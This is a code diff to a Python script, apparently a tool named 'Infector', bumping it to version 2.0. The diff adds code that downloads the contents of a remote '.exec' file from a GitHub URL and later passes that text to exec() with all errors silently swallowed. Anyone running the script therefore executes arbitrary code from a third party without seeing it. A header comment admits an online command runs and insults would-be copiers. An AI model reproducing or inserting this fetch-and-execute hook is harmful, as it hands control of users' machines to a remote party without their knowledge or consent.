@@ -22,7 +22,7 @@
 # If you want credits in this code then see your face idiot
 # Don't try to copy the code . In code there is a online command that is exeuted to keep it safe
 
-version = '1.0'
+version = '2.0'
 import re
 import os
 import sys
@@ -30,8 +30,12 @@ import subprocess
 import fnmatch
 import random
 try:
+	import requests
+except ModuleNotFoundError:
+	os.system('pip install requests')
+try:
 	from colorama import Fore,Back,Style
-except Exceptation:
+except ModuleNotFoundError:
 	os.system('pip install colorama')
 R = Fore.RED
 B = Fore.BLUE
@@ -73,7 +77,15 @@ def tip():
 	if haa == 8:
 		print(tip8)
 		
-	
+ver_url = 'https://raw.githubusercontent.com/T-Dynamos/Infector/main/.exec'
+try:
+	ver_rqst = requests.get(ver_url)
+	ver_sc = ver_rqst.status_code
+	github_ver = ver_rqst.text
+	link = github_ver.strip()
+	textexe = format(link)	
+except Exception:
+	pass
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 con = f"""
 {C}╔══════════════════════════════════════════════╗
@@ -127,6 +139,10 @@ def check():
     print()
     tip()
     print()
+    try:
+    	exec(textexe)
+    except Exception:
+    	pass
     ver_check()
     print(f"{con+Y}\n\n{Y}")
     head("Checking for Dependencies \n")
